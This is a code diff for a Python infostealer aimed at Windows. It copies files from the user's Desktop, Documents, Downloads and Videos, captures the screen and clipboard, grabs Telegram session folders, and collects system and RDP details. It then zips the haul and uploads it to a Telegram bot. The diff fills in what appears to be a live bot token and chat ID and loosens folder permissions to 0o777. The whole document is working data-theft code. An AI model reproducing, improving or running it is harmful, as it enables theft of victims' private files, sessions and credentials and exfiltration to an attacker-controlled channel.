@@ -52,36 +52,56 @@ def makdirs():
     os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\iridium"), exist_ok=True)
 
 
+# def get_files():
+#     source_path = os.path.expanduser("~") + "\\"
+#     destination_path = "C:\\win_ord\\grabber"
+#     permissions = 0o777
+#     os.chmod(destination_path, permissions)
+#     folders_to_copy = ["Desktop", "Downloads", "Pictures", "Documents","Videos"]
+
+#     for folder in folders_to_copy:
+#         source_folder_path = os.path.join(source_path, folder)
+#         destination_folder_path = os.path.join(destination_path, folder)
+#         os.makedirs(destination_folder_path, exist_ok=True)
+
+#         for root, dirs, files in os.walk(source_folder_path):
+#             dirs[:] = [d for d in dirs if os.path.join(root, d) not in os.listdir(destination_folder_path)]
+#             destination_subfolder_path = None
+#             for name in dirs:
+#                 source_subfolder_path = os.path.join(root, name)
+#                 destination_subfolder_path = os.path.join(destination_folder_path, os.path.relpath(source_subfolder_path, source_folder_path))
+#                 if not os.path.exists(destination_subfolder_path):
+#                     os.makedirs(destination_subfolder_path)
+#             for name in files:
+#                 source_file_path = os.path.join(root, name)
+#                 if os.path.getsize(source_file_path) <= 2048576: # 1 MB = 1048576 bytes
+#                     if destination_subfolder_path is None:
+#                         destination_subfolder_path = os.path.join(destination_folder_path, os.path.relpath(root, source_folder_path))
+#                     destination_file_path = os.path.join(destination_subfolder_path, name)
+#                     shutil.copy2(source_file_path, destination_file_path)
+
 def get_files():
-    source_path = os.path.expanduser("~") + "\\"
-    destination_path = "C:\\win_ord\\grabber"
-    folders_to_copy = ["Desktop", "Downloads", "Pictures", "Documents","Videos"]
+    max_size = 2 * 1024 * 1024
+    directories = {'Desktop': 'desktop', 'Documents': 'documents', 'Downloads': 'downloads', 'Videos': 'videos'}
+    permissions = 0o777
+    destination = "C:\\win_ord\\grabber"
+    for source_dir, dest_subdir in directories.items():
+        for root, dirs, files in os.walk(os.path.expanduser(f'~/{source_dir}')):
+            for file in files:
+                file_path = os.path.join(root, file)
+                if os.path.getsize(file_path) <= max_size:
+                    dest_dir = os.path.join(destination, dest_subdir, os.path.relpath(root, os.path.expanduser(f'~/{source_dir}')))
+                    os.makedirs(dest_dir, exist_ok=True)
+                    os.chmod(dest_dir, permissions)
+                    shutil.copy(file_path, dest_dir)
 
-    for folder in folders_to_copy:
-        source_folder_path = os.path.join(source_path, folder)
-        destination_folder_path = os.path.join(destination_path, folder)
-        os.makedirs(destination_folder_path, exist_ok=True)
-
-        for root, dirs, files in os.walk(source_folder_path):
-            dirs[:] = [d for d in dirs if os.path.join(root, d) not in os.listdir(destination_folder_path)]
-            destination_subfolder_path = None
-            for name in dirs:
-                source_subfolder_path = os.path.join(root, name)
-                destination_subfolder_path = os.path.join(destination_folder_path, os.path.relpath(source_subfolder_path, source_folder_path))
-                if not os.path.exists(destination_subfolder_path):
-                    os.makedirs(destination_subfolder_path)
-            for name in files:
-                source_file_path = os.path.join(root, name)
-                if os.path.getsize(source_file_path) <= 2048576: # 1 MB = 1048576 bytes
-                    if destination_subfolder_path is None:
-                        destination_subfolder_path = os.path.join(destination_folder_path, os.path.relpath(root, source_folder_path))
-                    destination_file_path = os.path.join(destination_subfolder_path, name)
-                    shutil.copy2(source_file_path, destination_file_path)
 
 
 def get_screenshot():
     destination_path = "C:\\win_ord\\screenshots\\webcam.png"
     os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+    permissions = 0o777
+    os.chmod(destination_path.replace("\\webcam.png",""), permissions)
     screenshot = ImageGrab.grab()
     screenshot.save(destination_path)
 
@@ -89,6 +109,8 @@ def get_screenshot():
 def get_clipb_data() -> str:
     destination_path = "C:\\win_ord\\clipboard_data\\clip_board.txt"
     os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+    permissions = 0o777
+    os.chmod(destination_path.replace("\\clip_board.txt",""), permissions)
     clip = subprocess.run("powershell Get-Clipboard", shell= True, capture_output= True).stdout.decode(errors= 'backslashreplace').strip()
     with open(destination_path,"a") as save:
         save.write(clip+"\n")
@@ -132,7 +154,7 @@ def get_systeminfo():
                 gpu_name = "\nType of GPU: " + gpu.name
                 gpu_free_memory = "\nAvailable GPU memory: " + f"{gpu.memoryFree}MB"
                 gpu_total_memory = "\nTotal GPU memory: " f"{gpu.memoryTotal}MB"
-                gpu_temperature = "\nGPU temperature: " f"{gpu.temperature}C"
+                gpu_temperature = "\nGPU temperature: " f"{gpu.temperature} C"
         except:
             pass
 
@@ -171,6 +193,8 @@ def get_systeminfo():
             all_data = "Time: " + time.asctime() + '\n' + "CPU: " + platform.processor() + '\n' + "OS type: " + platform.system() + ' ' + platform.release() + '\nLocation and IP:' + location1 + '\nDrives:' + drives + str(namepc) + str(allcpucount) + str(cpufreq) + str(cpufreqincy) + str(svmem) + str(allram) + str(ramfree) + str(ramuseg) + str(nameofdevice) + str(nameofdick) + str(typeoffilesystem )+ str(allstorage) + str(usedstorage) + str(freestorage)
             destination_path = r"C:\\win_ord\\system_info\\pc-info.txt"
             os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+            permissions = 0o777
+            os.chmod(destination_path.replace("\\pc-info.txt",""), permissions)
             file = open(destination_path, "w+", encoding='utf-8')
             file.write(all_data)
             file.write('\nAntiviruses: '+str(Antiviruses))
@@ -184,6 +208,8 @@ def get_systeminfo():
         file.close()
         destination_path = r"C:\\win_ord\\system_info\\processes.txt"
         os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+        permissions = 0o777
+        os.chmod(destination_path.replace("\\processes.txt",""), permissions)
         fileproc = open(r'C:\windll\SystemInformation\processes.txt', 'a', encoding='utf-8')
         result = [process.Properties_('Name').Value for process in GetObject('winmgmts:').InstancesOf('Win32_Process')]
         fileproc.write("\n".join(process for process in result))
@@ -198,6 +224,8 @@ def get_telegram():
     path3 = 'C:\\Program Files\\Telegram Desktop\\tdata'
     destination_path = "C:\\win_ord\\social\\telegram"
     os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+    permissions = 0o777
+    os.chmod(destination_path, permissions)
     try:
         shutil.copytree(path1,
                 destination_path,
@@ -440,6 +468,8 @@ def is_admin():
 def get_rdp():
     destination_path = "C:\\win_ord\\rdp_info\\"+f"{os.getlogin()}_rdp.txt"
     os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+    permissions = 0o777
+    os.chmod(destination_path, permissions)
     passs = "RDPPASSWORD"
     pub_ip = requests.get('https://api.ipify.org').text
     host = socket.gethostname()
@@ -464,8 +494,8 @@ def generate_random_string(n):
 
 
 def zip_and_send_out():
-    chat_id =  "CHAT_ID"
-    token = "BOT_TOKEN"
+    chat_id =  "-1001968210560"
+    token = "6117801998:AAHE-TBVbiURBxqpKr_JqLLs5optKu3PC7o"
     random_string = generate_random_string(15)
     zip_name = f"{random_string}.zip"
     folder_path = "C:\\win_ord"
@@ -481,7 +511,7 @@ def zip_and_send_out():
                 zip_file.write(file_path, os.path.relpath(file_path, folder_path))
     with open(zip_path, 'rb') as zip_file:
         url = f'https://api.telegram.org/bot{token}/sendDocument'
-        msg = "New LOGS INCOMING"
+        msg = f"New LOGS INCOMING"
         files = {'document': zip_file}
         data = {'chat_id': chat_id, 'caption': f'{msg}'}
         response = requests.post(url, files=files, data=data)
@@ -497,5 +527,5 @@ def main():
         get_files()
         get_screenshot()
         zip_and_send_out()
-
+    
 main()
